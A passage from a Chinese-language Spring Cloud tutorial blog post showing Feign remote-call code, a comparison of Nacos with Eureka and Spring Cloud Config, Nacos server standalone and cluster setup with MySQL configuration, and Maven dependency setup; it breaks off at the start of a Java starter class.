<p>具体的代码如下：</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>client</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">UserDTO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">RestOut</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>standard<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">FeignConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>fallback<span class="token punctuation">.</span></span><span class="token class-name">UserClientFallback</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>fallback<span class="token punctuation">.</span></span><span class="token class-name">UserClientFallbackFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>netflix<span class="token punctuation">.</span>hystrix<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>javanica<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">HystrixCommand</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>openfeign<span class="token punctuation">.</span></span><span class="token class-name">FeignClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Feign 客户端接口
 * @description: 用户信息 远程调用接口
 * @date 2019年7月22日
 */</span>

<span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"uaa-provider"</span><span class="token punctuation">,</span>
        configuration <span class="token operator">=</span> <span class="token class-name">FeignConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
        fallback <span class="token operator">=</span> <span class="token class-name">UserClientFallback</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
<span class="token comment">//        fallbackFactory = UserClientFallbackFactory.class,</span>
        path <span class="token operator">=</span> <span class="token string">"/uaa-provider/api/user"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserClient</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token comment">/**
     * 远程调用 RPC 方法：获取用户详细信息
     * @param userId 用户 Id
     * @return 用户详细信息
     */</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/detail/v1"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> <span class="token function">detail</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"userId"</span><span class="token punctuation">)</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="RESTRPC_1679"></a>通过REST服务的本地代理接口，进行RPC调用</h5> 
<p>进行RPC调用的具体的代码，在<strong>demo-provider</strong>模块中，如下图所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">TypeReference</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">UserDTO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">RestOut</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">JsonUtil</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">UserClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>netflix<span class="token punctuation">.</span>hystrix<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>javanica<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">HystrixCommand</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Api</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">ApiOperation</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">RestTemplateBuilder</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">ResponseEntity</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">RestTemplate</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span><span class="token punctuation">;</span>


<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/api/call/uaa/"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>tags <span class="token operator">=</span> <span class="token string">"演示 uaa-provider 远程调用"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UaaRemoteCallController</span>
<span class="token punctuation">{<!-- --></span>
 
    <span class="token comment">//注入 @FeignClient注解配置 所配置的 客户端实例</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token class-name">UserClient</span> userClient<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/user/detail/v2"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"Feign 远程调用"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">JSONObject</span><span class="token punctuation">&gt;</span></span> <span class="token function">remoteCallV2</span><span class="token punctuation">(</span>
            <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"userId"</span><span class="token punctuation">)</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> userClient<span class="token punctuation">.</span><span class="token function">detail</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"uaa-data"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">RestOut</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setRespMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>demo-provider需要依赖 <strong>uaa-client模块</strong></p> 
<h5><a id="demoprovider_1735"></a>启动demo-provider</h5> 
<p><img src="https://images2.imgbox.com/43/4e/2JhkVoFG_o.png" alt=""></p> 
<p>访问swagger ui：</p> 
<p><img src="https://images2.imgbox.com/b0/64/5od62BTW_o.png" alt=""></p> 
<h5><a id="swagger_RPC_1747"></a>通过swagger 执行RPC操作</h5> 
<p><img src="https://images2.imgbox.com/9a/f5/70bmQnkh_o.png" alt=""></p> 
<p><img src="https://images2.imgbox.com/9d/d9/D9Uu7IWu_o.png" alt=""></p> 
<h3><a id="SpringCloud__Eureka___1755"></a>SpringCloud Eureka 服务注册</h3> 
<p>Eureka 作为老牌 SpringCloud 注册中心，很多项目，仍然在使用，</p> 
<p>另外，底层原理都是想通的，大家可以和 nacos 对比学习</p> 
<p>Eureka 的详细介绍，请阅读 <a href="https://blog.csdn.net/crazymakercircle/article/details/115677785">《Java 高并发核心编程 卷3 加强版》</a></p> 
<h3><a id="SpringCloud_Config__1771"></a>SpringCloud Config 统一配置</h3> 
<p>SpringCloud Config 作为老牌 SpringCloud配置中心，很多项目，仍然在使用，</p> 
<p>另外，底层原理都是想通的，大家可以和 nacos 对比学习</p> 
<p>SpringCloud Config 的详细介绍，请阅读 <a href="https://blog.csdn.net/crazymakercircle/article/details/115677785">《Java 高并发核心编程 卷3 加强版》</a></p> 
<h3><a id="Nacos____1787"></a>Nacos 服务注册+ 统一配置</h3> 
<h4><a id="1Nacos___1792"></a>1、Nacos 优势</h4> 
<blockquote> 
 <p>问题，既然有了Eureka ，为啥还要用Nacos？</p> 
</blockquote> 
<p>而 Nacos 作为微服务核心的服务注册与发现中心，让大家在 Eureka 和 Consule 之外有了新的选择，开箱即用，上手简洁，暂时也没发现有太大的坑。</p> 
<h5><a id="11_eureka_1802"></a>1.1 与eureka对比</h5> 
<blockquote> 
 <p>1 eureka 2.0闭源码了。</p> 
 <p>2 从官网来看nacos 的注册的实例数是大于eureka的,</p> 
 <p>3 因为nacos使用的raft协议,nacos集群的一致性要远大于eureka集群.</p> 
</blockquote> 
<p>分布式一致性协议 Raft，自 2013 年论文发表，之后就受到了技术领域的热捧，与其他的分布式一致性算法比，Raft 相对比较简单并且易于实现，这也是 Raft 能异军突起的主要因素。</p> 
<p><img src="https://images2.imgbox.com/ee/03/Y3kZGW6S_o.png" alt=""></p> 
<blockquote> 
 <h3><a id="Raft__1820"></a>Raft 的数据一致性策略</h3> 
 <p>Raft 协议强依赖 Leader 节点来确保集群数据一致性。即 client 发送过来的数据均先到达 Leader 节点，Leader 接收到数据后，先将数据标记为 uncommitted 状态，随后 Leader 开始向所有 Follower 复制数据并等待响应，在获得集群中大于 N/2 个 Follower 的已成功接收数据完毕的响应后，Leader 将数据的状态标记为 committed，随后向 client 发送数据已接收确认，在向 client 发送出已数据接收后，再向所有 Follower 节点发送通知表明该数据状态为committed。</p> 
</blockquote> 
<h5><a id="12_springcloud_config__1826"></a>1.2 与springcloud config 对比</h5> 
<h6><a id="_1828"></a>三大优势：</h6> 
<ul><li>springcloud config大部分场景结合git 使用, 动态变更还需要依赖Spring Cloud Bus 消息总线来通过所有的客户端变化.</li><li>springcloud config不提供可视化界面</li><li>nacos config使用长连接更新配置, 一旦配置有变动后，通知Provider的过程非常的迅速, 从速度上秒杀springcloud原来的config几条街,</li></ul> 
<h4><a id="2Spring_Cloud_Alibaba__1836"></a>2、Spring Cloud Alibaba 套件</h4> 
<p>目前 Spring Cloud Alibaba 主要有三个组件：</p> 
<ul><li>Nacos：一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</li><li>Sentinel：把流量作为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。</li><li>AliCloud OSS: 阿里云对象存储服务（Object Storage Service，简称 OSS），是阿里云提供的海量、安全、低成本、高可靠的云存储服务。您可以在任何应用、任何时间、任何地点存储和访问任意类型的数据。</li></ul> 
<h5><a id="Spring_Cloud_Alibaba_Spring_Cloud_Netflix_1844"></a>Spring Cloud Alibaba 套件和Spring Cloud Netflix套件类比</h5> 
<p>仔细看看各组件的功能描述，Spring Cloud Alibaba 套件和Spring Cloud Netflix套件大致的对应关系：</p> 
<ul><li>Nacos = Eureka/Consule + Config + Admin</li><li>Sentinel = Hystrix + Dashboard + Turbine</li><li>Dubbo = Ribbon + Feign</li><li>RocketMQ = RabbitMQ</li><li>Schedulerx = Quartz</li><li>AliCloud OSS、AliCloud SLS 这三个应该是独有的</li></ul> 
<p>链路跟踪（Sleuth、Zipkin）不知道会不会在 Sentinel 里</p> 
<p>以上只是猜测，待我从坑里爬出来之后再回来更新。也欢迎大家一起交流探讨~</p> 
<p>这里我就先试试 Nacos。</p> 
<h4><a id="3Nacos__1861"></a>3、Nacos 的架构和安装</h4> 
<h5><a id="31_Nacos__1863"></a>3.1 Nacos 的架构</h5> 
<p><img src="https://images2.imgbox.com/11/67/zHYZ532C_o.png" alt="image"></p> 
<p>这是 Nacos 的架构图，可以看到它确实是融合了服务注册发现中心、配置中心、服务管理等功能，类似于 Eureka/Consule + Config + Admin 的合体。</p> 
<p>另外通过官方文档发现，Nacos 除了可以和 Spring Cloud 集成，还可以和 Spring、SpringBoot 进行集成。</p> 
<p>不过我们只关注于 Spring Cloud，别的就略过了，直接上手实战吧。</p> 
<h5><a id="32_Nacos_Server__1875"></a>3.2 Nacos Server 的下载和安装</h5> 
<p>在使用 Nacos 之前，需要先下载 Nacos 并启动 Nacos Server。</p> 
<blockquote> 
 <p>安装的参考教程：</p> 
 <p>https://www.cnblogs.com/crazymakercircle/p/11992539.html</p> 
</blockquote> 
<h4><a id="4Nacos_Server__1887"></a>4、Nacos Server 的运行</h4> 
<h5><a id="41_1891"></a>4.1两种模式</h5> 
<p>Nacos Server 有两种运行模式：</p> 
<ul><li>standalone</li><li>cluster</li></ul> 
<h5><a id="42_standalone__1898"></a>4.2 standalone 模式</h5> 
<p>此模式一般用于 demo 和测试，不用改任何配置，直接敲以下命令执行</p> 
<pre><code class="prism language-bash"><span class="token function">sh</span> bin/startup.sh -m standalone
</code></pre> 
<p>Windows 的话就是</p> 
<pre><code class="prism language-bash">cmd bin/startup.cmd -m standalone
</code></pre> 
<p>然后从 http://cdh1:8848/nacos/index.html 进入控制台就能看到如下界面了</p> 
<p><img src="https://images2.imgbox.com/2c/70/CF3J8J4J_o.png" alt="image"></p> 
<p>默认账号和密码为：nacos nacos</p> 
<h5><a id="43_cluster__1920"></a>4.3 cluster 模式</h5> 
<p>测试环境，可以先用 standalone 模式撸起来，享受 coding 的快感，但是，生产环境可以使用 cluster 模式。</p> 
<h6><a id="cluster__MySQL_1924"></a>cluster 模式需要依赖 MySQL，然后改两个配置文件：</h6> 
<pre><code class="prism language-bash">conf/cluster.conf
conf/application.properties
</code></pre> 
<p>大致如下：</p> 
<p>1： cluster.conf，填入要运行 Nacos Server 机器的 ip</p> 
<pre><code>192.168.100.155
192.168.100.156
</code></pre> 
<ol start="2"><li>修改NACOS_PATH/conf/application.properties，加入 MySQL 配置</li></ol> 
<pre><code class="prism language-properties">db.num=1
db.url.0=jdbc:mysql://localhost:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true
db.user=root
db.password=root
</code></pre> 
<p>创建一个名为nacos_config的 database，将NACOS_PATH/conf/nacos-mysql.sql中的表结构导入刚才创建的库中，这几张表的用途就自己研究吧</p> 
<h5><a id="44_Nacos_Server__1953"></a>4.4 Nacos Server 的配置数据是存在哪里呢？</h5> 
<blockquote> 
 <p>问题来了： Nacos Server 的配置数据是存在哪里呢？</p> 
</blockquote> 
<p>我们没有对 Nacos Server 做任何配置，那么数据只有两个位置可以存储：</p> 
<ul><li>内存</li><li>本地数据库</li></ul> 
<p>如果我们现在重启刚刚在运行的 Nacos Server，会发现刚才加的 nacos.properties 配置还在，说明不是内存存储的。</p> 
<p>这时候我们打开NACOS_PATH/data，会发现里边有个derby-data目录，我们的配置数据现在就存储在这个库中。</p> 
<blockquote> 
 <p>Derby 是 Java 编写的数据库，属于 Apache 的一个开源项目</p> 
</blockquote> 
<p>如果将数据源改为我们熟悉的 MySQL 呢？当然可以。</p> 
<blockquote> 
 <p>注意：不支持 MySQL 8.0 版本</p> 
</blockquote> 
<p>这里有两个坑：</p> 
<blockquote> 
 <p>Nacos Server 的数据源是用 Derby 还是 MySQL 完全是由其运行模式决定的：</p> 
</blockquote> 
<pre><code>standalone 的话仅会使用 Derby，即使在 application.properties 里边配置 MySQL 也照样无视；
cluster 模式会自动使用 MySQL，这时候如果没有 MySQL 的配置，是会报错的。
</code></pre> 
<p>官方提供的 cluster.conf 示例如下</p> 
<pre><code>#it is ip
#example
10.10.109.214
11.16.128.34
11.16.128.36
</code></pre> 
<p>以上配置结束后，运行 Nacos Server 就能看到效果了。</p> 
<h4><a id="51Nacos_1999"></a>5、实战1：使用Nacos作为注册中心</h4> 
<h5><a id="_2001"></a>实战的工程</h5> 
<p>实战的工程的目录结构如下：</p> 
<p><img src="https://images2.imgbox.com/fd/99/xLnm7fAp_o.png" alt=""></p> 
<h5><a id="51_Nacos___Client_2007"></a>5.1 如何使用Nacos Client组件</h5> 
<h6><a id="_Spring_Cloud_Alibaba__BOM_2009"></a>首先引入 Spring Cloud Alibaba 的 BOM</h6> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.4.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-cloud.version</span><span class="token punctuation">&gt;</span></span>Finchley.SR2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-cloud.version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-cloud-alibaba.version</span><span class="token punctuation">&gt;</span></span>0.2.0.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-cloud-alibaba.version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencyManagement</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-alibaba-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${spring-cloud-alibaba.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>import<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${spring-cloud.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>import<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencyManagement</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>这里版本号有坑，文档上说和 Spring Boot 2.0.x 版本兼容，但是实测 2.0.6.RELEASE 报错</p> 
<pre><code>java.lang.NoClassDefFoundError: org/springframework/core/env/EnvironmentCapable
</code></pre> 
<h5><a id="52__2050"></a>5.2 演示的模块结构</h5> 
<p>服务注册中心和服务发现的服务端都是由 Nacos Server 来提供的，我们只需要提供 Service 向其注册就好了。</p> 
<p>这里模拟提供两个 service：provider 和 consumer</p> 
<pre><code>alibaba
├── service-provider-demo
│   ├── pom.xml
│   └── src
└── sevice-consumer-demo
│   ├── pom.xml
│   └── src
└── pom.xml
</code></pre> 
<h5><a id="53_provider___2069"></a>5.3 provider 微服务</h5> 
<h6><a id="step1_provider__consumer__pom__2073"></a>step1：在 provider 和 consumer 的 pom 添加以下依赖：</h6> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-discovery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h6><a id="step2_2090"></a>step2：启动类</h6> 
<p>使用 Spring Cloud 的原生注解 @EnableDiscoveryClient 开启服务注册与发现</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>starter</span><span class="token punctuation">;</span>

